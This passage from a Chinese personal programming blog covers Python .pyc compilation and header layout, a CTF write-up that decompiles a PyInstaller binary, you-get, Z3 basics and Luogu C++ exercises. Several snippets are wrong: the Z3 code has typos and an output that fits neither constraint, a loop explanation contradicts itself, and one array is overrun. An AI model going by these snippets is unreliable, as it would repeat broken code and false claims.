title="批量生成pyc文件"></a>批量生成pyc文件</h2><ul><li><strong>代码实现</strong><code>**import compileall**</code></li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**compileall.compile_dir(r&#x27;H:/game&#x27;) ##把game目录下以及其子目录下的py文件都编译为pyc文件**</span><br></pre></td></tr></table></figure></div><p><strong>compileall()函数语法：</strong></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile_dir(dir[, maxlevels[, ddir[, force[, rx[, quiet]]]]])</span><br></pre></td></tr></table></figure></div><p>dir： 表示编译文件的文件夹位置</p><p>maxlevels ：表示需要递归编译的子目录的层数，默认是10层，即默认会把10层子目录中的py文件编译为pyc</p><p>ddir ：表示错误消息保存的路径</p><p>force：当为true时表示会被强制编译成pyc文件，即使pyc文件是最新的依然会被强制编译一次 </p><p>rx： 表示一个正则表达式，可以排除掉不想要的目录，或者只有符合条件的目录才进行编译</p><p>quiet：当为True时，在编译后不会再标准输出中来打印信息</p><h1 id="pyc文件的格式"><a href="#pyc文件的格式" class="headerlink" title="pyc文件的格式"></a>pyc文件的格式</h1><p>pyc文件的字节码</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1661705835169-a4ead24c-7b79-4ad2-8407-f0c30d206045.png"                      alt="img"                ></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">03f3 0d0amagic number表示python的版本信息;</span><br><span class="line"></span><br><span class="line">6206 b160 时间戳，编译的时间信息</span><br><span class="line"></span><br><span class="line">63 Blockde的开头</span><br><span class="line"></span><br><span class="line">后4字节0000 0000 ：argcount：参数个数</span><br><span class="line"></span><br><span class="line">后4字节0000 0000： nlocals：局部变量个数</span><br><span class="line"></span><br><span class="line">后4字节1b00 0000:    stacksize(栈空间大小)</span><br><span class="line"></span><br><span class="line">后4字节4000 0000：  flags：特殊标志的flags</span><br><span class="line"></span><br><span class="line">73:类型是string</span><br><span class="line"></span><br><span class="line">3501 0000 字节长度（小端模式）</span><br><span class="line"></span><br><span class="line">之后是opcode（操作码）</span><br></pre></td></tr></table></figure></div><p><strong>时间戳</strong></p><p>时间戳的主要目的在于通过一定的技术手段，对数据产生的时间进行认证，从而验证这段数据在产生后是否经过篡改。</p><p>个人理解是，时间戳指的是对数修改的时间记录。类似你修改一个文件，而文件后面会保存你文件修改的时间，这个时间就是时间戳。</p><p>时间戳的协议：</p><ul><li>简单的时间戳协议</li><li>线性链接协议</li><li>树形协议</li><li>二进制协议</li><li>线索认证树协议</li><li>分布式协议</li></ul><h1 id="pyc文件逆向的实例–-SUSCTF-DigitalCircuits"><a href="#pyc文件逆向的实例–-SUSCTF-DigitalCircuits" class="headerlink" title="pyc文件逆向的实例–[SUSCTF]DigitalCircuits"></a>pyc文件逆向的实例–[SUSCTF]DigitalCircuits</h1><p> 解题：</p><p>直接解压压缩包，看到是这样的文件，查看文件的详细信息</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1661706291563-d31d7805-be6e-443b-bc88-8420188a6c9b.png"                      alt="img"                ></p><p>很容易看出是用python写的文件，并将python打包成exe的——用python的思路解包，及使用解 python的软件——pyinstxtractor-master（另附项目地址：<a class="link"   href="https://github.com/extremecoders-re/pyi" >https://github.com/extremecoders-re/pyi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> nstxtractor）</p><ul><li>python解包</li></ul><p>在解包脚本的路径下输入cmd打开命令行， </p><p>解包后是这样的界面 同时会得到一个文件 在文件中找到需要恢复的字节码文件——DigitalCircuits.pyc，然而这个文件是一个这个文件是用 010editor打开 查看最上面一排（由于笔者操作太快，忘截图了），其缺少magic numbers（用来标记文件或者协议的 格式，很多文件都有幻数标志来表明该文件的格式。）和相关的文件识别属性。 stuct.pyc文件包含一个完整可用的首部,可以用来修复.pyc文件，即将stuct.pyc文件最上面一排cv到 DigitalCircuits.pyc文件，保存。 由于pyc文件是二进制文件，所以需要将这个二进制文件转成py文件（ps：uncompyle6，然而作 者太菜，先用队友推荐的在线转的工具）可以得到DigitalCirciuts的源代码  </p><h1 id="【Python】爬取网页视频-20230117"><a href="#【Python】爬取网页视频-20230117" class="headerlink" title="【Python】爬取网页视频(20230117)"></a>【Python】爬取网页视频(20230117)</h1><h1 id="you-get简易版"><a href="#you-get简易版" class="headerlink" title="you-get简易版"></a>you-get简易版</h1><p>首先在python36下直接cmd 输入安装命令：<code>pip install you-get</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/About_python.assets/1673937581360-9c46de9a-be9b-4187-ac17-dbea89ccc020.png"                      alt="img"                ></p><p>安装好了之后就直接在计划将视频放入的文件下输入cmd进行爬取命令的输入：<code>you-get videourl</code></p><h1 id="【Python】Z3求解器的结果输出-python"><a href="#【Python】Z3求解器的结果输出-python" class="headerlink" title="【Python】Z3求解器的结果输出(python)"></a>【Python】Z3求解器的结果输出(python)</h1><h3 id="1-安装和导包"><a href="#1-安装和导包" class="headerlink" title="1.安装和导包"></a>1.安装和导包</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装</span></span><br><span class="line">pip install z3-solver</span><br><span class="line"><span class="comment">#导包</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></div><h3 id="2-声明变量"><a href="#2-声明变量" class="headerlink" title="2.声明变量"></a>2.声明变量</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#变量是整数</span></span><br><span class="line"><span class="comment">#逐一定义</span></span><br><span class="line">a = Int(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = Int(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment">#一起定义</span></span><br><span class="line">a,b = Ints(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="comment">#变量为实数</span></span><br><span class="line"><span class="comment">##逐一定义</span></span><br><span class="line">c = Real(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">d = Real(<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"><span class="comment">##一起定义</span></span><br><span class="line">c,d = Reals(<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>)</span><br></pre></td></tr></table></figure></div><h3 id="3-建立模型约束"><a href="#3-建立模型约束" class="headerlink" title="3. 建立模型约束"></a>3. 建立模型约束</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##求解器</span></span><br><span class="line">S = Solver()</span><br><span class="line"><span class="comment">##添加约束</span></span><br><span class="line">s.add=(a+b==<span class="number">8</span>)</span><br><span class="line">s.add=(a-b==<span class="number">8</span>)</span><br></pre></td></tr></table></figure></div><h3 id="4-模型求解"><a href="#4-模型求解" class="headerlink" title="4.模型求解"></a>4.模型求解</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##检查模型是否有解</span></span><br><span class="line">s.check() </span><br><span class="line"><span class="comment">#模型有解输出 sat;否则就是unsat</span></span><br><span class="line">Out[<span class="number">14</span>]:sat</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算结果</span></span><br><span class="line">s.model()</span><br><span class="line">Out[<span class="number">15</span>]:[a = <span class="number">5</span>,d = <span class="number">3</span>]</span><br></pre></td></tr></table></figure></div><h3 id="5-补充"><a href="#5-补充" class="headerlink" title="5.补充"></a>5.补充</h3><p>fraction类型(分数有理数)的数据可以直接转换成flaot类型</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d_float</span><br><span class="line">Out[<span class="number">30</span>]: Fraction(<span class="number">3</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>(d_float)</span><br><span class="line">Out[<span class="number">31</span>]: <span class="number">3.0</span></span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="python" scheme="https://juana-2u.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Something</title>
    <link href="https://juana-2u.github.io/2023/10/14/Something/"/>
    <id>https://juana-2u.github.io/2023/10/14/Something/</id>
    <published>2023-10-14T04:01:05.000Z</published>
    <updated>2023-10-14T06:54:25.424Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LuoGo刷题（20220107）"><a href="#LuoGo刷题（20220107）" class="headerlink" title="LuoGo刷题（20220107）"></a>LuoGo刷题（20220107）</h1><h4 id="1-自动填充0"><a href="#1-自动填充0" class="headerlink" title="1.自动填充0"></a>1.自动填充0</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span><span class="comment">//自动填充0的头文件</span></span></span><br><span class="line">cout&lt;&lt;<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>)&lt;&lt;<span class="built_in">setw</span>(<span class="number">2</span>)&lt;&lt;h&lt;&lt;<span class="string">&quot;:&quot;</span>&lt;&lt;<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>)&lt;&lt;<span class="built_in">setw</span>(<span class="number">2</span>)&lt;&lt;m&lt;&lt;endl;</span><br><span class="line"><span class="comment">//输出的顺序没影响，是双引号的问题，如果是setfill(&quot;0&quot;)就会报错</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div><h4 id="2-一维数组的输入"><a href="#2-一维数组的输入" class="headerlink" title="2.一维数组的输入"></a>2.一维数组的输入</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> a[<span class="number">9</span>];</span><br><span class="line"><span class="type">int</span> b=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cin &gt;&gt; a[<span class="number">0</span>];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">    cin &gt;&gt; a[<span class="number">1</span>] &gt;&gt; a[<span class="number">2</span>] &gt;&gt; a[<span class="number">3</span>];</span><br><span class="line"> cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">    cin &gt;&gt; a[<span class="number">4</span>] &gt;&gt; a[<span class="number">5</span>] &gt;&gt; a[<span class="number">6</span>] &gt;&gt; a[<span class="number">7</span>] &gt;&gt; a[<span class="number">8</span>];</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;-&quot;</span>;</span><br><span class="line">    cin &gt;&gt; a[<span class="number">9</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>问题一：数组的长度应该是长度+1 还有一个”&#x2F;0”的结尾符号</li><li>问题二：数组的输入：</li></ul><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sorce[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(sorce)/<span class="built_in">sizeof</span>(sorce[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;请输入第&quot;</span> &lt;&lt; i+<span class="number">1</span> &lt;&lt; <span class="string">&quot;个学生的成绩（共十个）：&quot;</span> ;</span><br><span class="line">        cin &gt;&gt; sorce[i];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><ul><li>问题三：一般函数中的符号用’ ‘(单引号)，输出时用” “（双引号）</li><li>问题四：数组中的元素要判断是什么类型 是否可以直接与 数字 进行运算</li></ul><details class="lake-collapse"><summary id="uad2f57fc"><span class="ne-text">例题:ISBN码</span></summary><h2 id="A5Hp6" style="font-size: 24px; line-height: 32px; margin: 21px 0 5px 0"><span class="ne-text">例题：题目描述</span></h2><p id="uc88cfa5a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">每一本正式出版的图书都有一个 ISBN 号码与之对应，ISBN 码包括 </span><span class="ne-text">9</span><span class="ne-text">9</span><span class="ne-text"> 位数字、</span><span class="ne-text">1</span><span class="ne-text">1</span><span class="ne-text"> 位识别码和 </span><span class="ne-text">3</span><span class="ne-text">3</span><span class="ne-text"> 位分隔符，其规定格式如 </span><span class="ne-text">x-xxx-xxxxx-x</span><span class="ne-text">，其中符号 </span><span class="ne-text">-</span><span class="ne-text"> 就是分隔符（键盘上的减号），最后一位是识别码，例如 </span><span class="ne-text">0-670-82162-4</span><span class="ne-text">就是一个标准的 ISBN 码。ISBN 码的首位数字表示书籍的出版语言，例如 </span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text"> 代表英语；第一个分隔符 </span><span class="ne-text">-</span><span class="ne-text"> 之后的三位数字代表出版社，例如 </span><span class="ne-text">670</span><span class="ne-text">6</span><span class="ne-text">7</span><span class="ne-text">0</span><span class="ne-text"> 代表维京出版社；第二个分隔符后的五位数字代表该书在该出版社的编号；最后一位为识别码。</span></p><p id="ub7f8eecf" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">识别码的计算方法如下：</span></p><p id="u273cf238" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">首位数字乘以 </span><span class="ne-text">1</span><span class="ne-text">1</span><span class="ne-text"> 加上次位数字乘以 </span><span class="ne-text">2</span><span class="ne-text">2</span><span class="ne-text"> ……以此类推，用所得的结果 </span><span class="ne-text">m</span><span class="ne-text">o</span><span class="ne-text">d</span><span class="ne-text">11</span><span class="ne-text">m</span><span class="ne-text">o</span><span class="ne-text">d</span><span class="ne-text">1</span><span class="ne-text">1</span><span class="ne-text">，所得的余数即为识别码，如果余数为 </span><span class="ne-text">10</span><span class="ne-text">1</span><span class="ne-text">0</span><span class="ne-text">，则识别码为大写字母 </span><span class="ne-text">X</span><span class="ne-text">X</span><span class="ne-text">。例如 ISBN 号码 </span><span class="ne-text">0-670-82162-4</span><span class="ne-text"> 中的识别码 </span><span class="ne-text">4</span><span class="ne-text">4</span><span class="ne-text"> 是这样得到的：对 </span><span class="ne-text">067082162</span><span class="ne-text"> 这 </span><span class="ne-text">9</span><span class="ne-text">9</span><span class="ne-text"> 个数字，从左至右，分别乘以 </span><span class="ne-text">1</span><span class="ne-text">,</span><span class="ne-text">2</span><span class="ne-text">,</span><span class="ne-text">…</span><span class="ne-text">,</span><span class="ne-text">9</span><span class="ne-text">1</span><span class="ne-text">,</span><span class="ne-text">2</span><span class="ne-text">,</span><span class="ne-text">…</span><span class="ne-text">,</span><span class="ne-text">9</span><span class="ne-text"> 再求和，即 </span><span class="ne-text">0</span><span class="ne-text">×</span><span class="ne-text">1</span><span class="ne-text">+</span><span class="ne-text">6</span><span class="ne-text">×</span><span class="ne-text">2</span><span class="ne-text">+</span><span class="ne-text">…</span><span class="ne-text">…</span><span class="ne-text">+</span><span class="ne-text">2</span><span class="ne-text">×</span><span class="ne-text">9</span><span class="ne-text">=</span><span class="ne-text">158</span><span class="ne-text">0</span><span class="ne-text">×</span><span class="ne-text">1</span><span class="ne-text">+</span><span class="ne-text">6</span><span class="ne-text">×</span><span class="ne-text">2</span><span class="ne-text">+</span><span class="ne-text">…</span><span class="ne-text">…</span><span class="ne-text">+</span><span class="ne-text">2</span><span class="ne-text">×</span><span class="ne-text">9</span><span class="ne-text">=</span><span class="ne-text">1</span><span class="ne-text">5</span><span class="ne-text">8</span><span class="ne-text">，然后取 </span><span class="ne-text">158</span><span class="ne-text">m</span><span class="ne-text">o</span><span class="ne-text">d</span><span class="ne-text">11</span><span class="ne-text">1</span><span class="ne-text">5</span><span class="ne-text">8</span><span class="ne-text">m</span><span class="ne-text">o</span><span class="ne-text">d</span><span class="ne-text">1</span><span class="ne-text">1</span><span class="ne-text"> 的结果 </span><span class="ne-text">4</span><span class="ne-text">4</span><span class="ne-text"> 作为识别码。</span></p><p id="u6f30beda" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">你的任务是编写程序判断输入的 ISBN 号码中识别码是否正确，如果正确，则仅输出 Right；如果错误，则输出你认为是正确的 ISBN 号码。</span></p><h2 id="D397J" style="font-size: 24px; line-height: 32px; margin: 21px 0 5px 0"><span class="ne-text">输入格式</span></h2><p id="u122efd39" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">一个字符序列，表示一本书的 ISBN 号码（保证输入符合 ISBN 号码的格式要求）。</span></p><h2 id="devIX" style="font-size: 24px; line-height: 32px; margin: 21px 0 5px 0"><span class="ne-text">输出格式</span></h2><p id="uaf7d606b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">一行，假如输入的 ISBN 号码的识别码正确，那么输出 </span><span class="ne-text">Right</span><span class="ne-text">，否则，按照规定的格式，输出正确的 ISBN 号码（包括分隔符 </span><span class="ne-text">-</span><span class="ne-text">）。</span></p><h2 id="aZBUg" style="font-size: 24px; line-height: 32px; margin: 21px 0 5px 0"><span class="ne-text">输入输出样例</span></h2><p id="ub167582a" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><strong><span class="ne-text">输入 #1                                  输出 #1</span></strong></p><p id="udf7f76f3" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">0-670-82162-4                      Right</span></p><p id="uc9d49a6c" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><strong><span class="ne-text">输入 #2                                  输出 #2</span></strong></p><p id="ub2172508" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">0-670-82162-0                      0-670-82162-4</span></p></details><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> a[<span class="number">13</span>], b = <span class="number">1</span>, t[<span class="number">12</span>] = <span class="string">&quot;0123456789X&quot;</span>;<span class="comment">//数组后面还有一个&quot;/0&quot; </span></span><br><span class="line"><span class="comment">//由于分隔符的原因 将数组定义为char类型</span></span><br><span class="line"><span class="comment">//gets(a);直接输入数组a</span></span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(a); i++) &#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] == <span class="string">&#x27;-&#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">c+= (a[i] - <span class="string">&#x27;0&#x27;</span>) * b++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (t[c % <span class="number">11</span>] == a[<span class="number">12</span>]) &#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;Right&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">a[<span class="number">12</span>] = t[c % <span class="number">11</span>];</span><br><span class="line"><span class="comment">//如果输入的并不是识别码的话 是需要修改过来的。</span></span><br><span class="line"><span class="built_in">puts</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h4 id="3-for循环条件的设定"><a href="#3-for循环条件的设定" class="headerlink" title="3.for循环条件的设定"></a>3.for循环条件的设定</h4><h5 id="C-中for-int-i-1-i"><a href="#C-中for-int-i-1-i" class="headerlink" title="C++中for (int i &#x3D; 1; i &lt;&#x3D; n; i++) 和for (int i &#x3D;0 ; i &lt;&#x3D; n; i++)有什么区别？"></a>C++中for (int i &#x3D; 1; i &lt;&#x3D; n; i++) 和for (int i &#x3D;0 ; i &lt;&#x3D; n; i++)有什么区别？</h5><p>在 C++ 中，这两个循环的区别在于循环次数和循环变量的初始值和终止值。</p><p>在<strong>for (int i &#x3D; 1; i &lt;&#x3D; n; i++)</strong> 循环中，循环变量 i 的初始值为 1，终止值为 n，所以循环会执行 n 次。在每次循环中，循环变量 i 的值会自增 1。</p><p>在**for (int i &#x3D;0 ; i &lt;&#x3D; n; i++)**循环中，循环变量 i 的初始值为 0，终止值为 n，所以循环会执行 n+1 次。在每次循环中，循环变量 i 的值会自增 1。</p><p>例如，</p><p>如果 n 等于 3，那么第一个循环会执行三次，每次的 i 的值分别为 1、2 和 3。</p><p>第二个循环也会执行三次，每次的 i 的值分别为 0、1 和 2。</p><p>通常来说：</p><p>如果你想要循环执行 n 次，你可以使用 for (int i &#x3D; 0; i &lt; n; i++)，这样 i 的值就会从 0 到 n-1。</p><p>如果你想要循环执行 n+1 次，你可以使用 for (int i &#x3D; 0; i &lt;&#x3D; n; i++)，这样 i 的值就会从 0 到 n。</p><h4 id="4-清屏的指令"><a href="#4-清屏的指令" class="headerlink" title="4.清屏的指令"></a>4.清屏的指令</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cls&quot;);</span><br></pre></td></tr></table></figure></div><h4 id="5-回文质数的判断"><a href="#5-回文质数的判断" class="headerlink" title="5.回文质数的判断"></a>5.回文质数的判断</h4><details class="lake-collapse"><summary id="u6825a711"><span class="ne-text">回文质数</span></summary><h4 id="slkPY" style="font-size: 16px; line-height: 24px; margin: 10px 0 5px 0"><span class="ne-text">题目描述</span></h4><p id="u77b034a3" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">因为 </span><span class="ne-text">151</span><span class="ne-text">1</span><span class="ne-text">5</span><span class="ne-text">1</span><span class="ne-text"> 既是一个质数又是一个回文数（从左到右和从右到左是看一样的），所以 </span><span class="ne-text">151</span><span class="ne-text">1</span><span class="ne-text">5</span><span class="ne-text">1</span><span class="ne-text"> 是回文质数。</span></p><p id="u4dc6e081" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">写一个程序来找出范围 </span><span class="ne-text">[</span><span class="ne-text">a</span><span class="ne-text">,</span><span class="ne-text">b</span><span class="ne-text">]</span><span class="ne-text">(</span><span class="ne-text">5</span><span class="ne-text">≤</span><span class="ne-text">a</span><span class="ne-text">&lt;</span><span class="ne-text">b</span><span class="ne-text">≤</span><span class="ne-text">100</span><span class="ne-text">,</span><span class="ne-text">000</span><span class="ne-text">,</span><span class="ne-text">000</span><span class="ne-text">)</span><span class="ne-text">[</span><span class="ne-text">a</span><span class="ne-text">,</span><span class="ne-text">b</span><span class="ne-text">]</span><span class="ne-text">(</span><span class="ne-text">5</span><span class="ne-text">≤</span><span class="ne-text">a</span><span class="ne-text">&lt;</span><span class="ne-text">b</span><span class="ne-text">≤</span><span class="ne-text">1</span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text">,</span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text">,</span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text">0</span><span class="ne-text">)</span><span class="ne-text">（一亿）间的所有回文质数。</span></p><h4 id="tyyMP" style="font-size: 16px; line-height: 24px; margin: 10px 0 5px 0"><span class="ne-text">输入格式</span></h4><p id="u2cfec773" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">第一行输入两个正整数 </span><span class="ne-text">a</span><span class="ne-text">a</span><span class="ne-text"> 和 </span><span class="ne-text">b</span><span class="ne-text">b</span><span class="ne-text">。</span></p><h4 id="B48k8" style="font-size: 16px; line-height: 24px; margin: 10px 0 5px 0"><span class="ne-text">输出格式</span></h4><p id="ueb694206" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">输出一个回文质数的列表，一行一个。</span></p><h4 id="MBChb" style="font-size: 16px; line-height: 24px; margin: 10px 0 5px 0"><span class="ne-text">输入输出样例</span></h4><p id="uf62c4714" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><strong><span class="ne-text">输入 #1                 </span></strong><span class="ne-text"> </span><strong><span class="ne-text">输出 #1</span></strong></p><p id="ue2f59c3b" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">5 500                     5 7 11 101 131 151 181 191 313 353 373 383</span></p></details><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;cmath&gt;</span></span><br><span class="line"><span class="comment">#include &lt;algorithm&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line"><span class="built_in">int</span> a, b;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="built_in">int</span> flag = 